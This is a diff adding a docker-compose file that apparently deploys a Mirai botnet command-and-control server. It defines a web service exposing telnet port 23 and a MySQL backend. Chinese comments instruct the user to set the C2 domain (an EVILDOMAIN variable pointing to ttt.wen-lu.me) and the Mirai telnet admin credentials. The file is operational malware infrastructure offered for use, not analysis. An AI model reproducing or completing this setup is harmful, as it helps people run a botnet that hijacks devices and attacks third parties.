@@ -1,0 +1,26 @@
+version: '3'
+services:
+  web:
+    build: .
+    ports:
+      - "62223:23" # 修改映射端口 例如62223:23 将docker容器的23端口映射到本机的62223端口
+    volumes:
+      - ./share:/root/share
+    environment:
+      - MYSQL_HOST=mysql
+      - MYSQL_USER=root
+      - MYSQL_PASSWORD=your_password # 修改数据库密码
+      - EVILDOMAIN=ttt.wen-lu.me # 修改cc域名
+      - MIRAI_ADMIN_USERNAME=admin # 修改telnet登录用户名
+      - MIRAI_ADMIN_PASSWORD=admin123 # 修改telnet登录密码
+    depends_on:
+      - mysql
+    links:
+      - mysql
+  mysql:
+    image: "mysql:5.6"
+    environment:
+      MYSQL_ROOT_PASSWORD: "your_password" # 修改数据库密码
+      TZ: 'Asia/Shanghai'
+    command: ['mysqld', '--character-set-server=utf8']
+
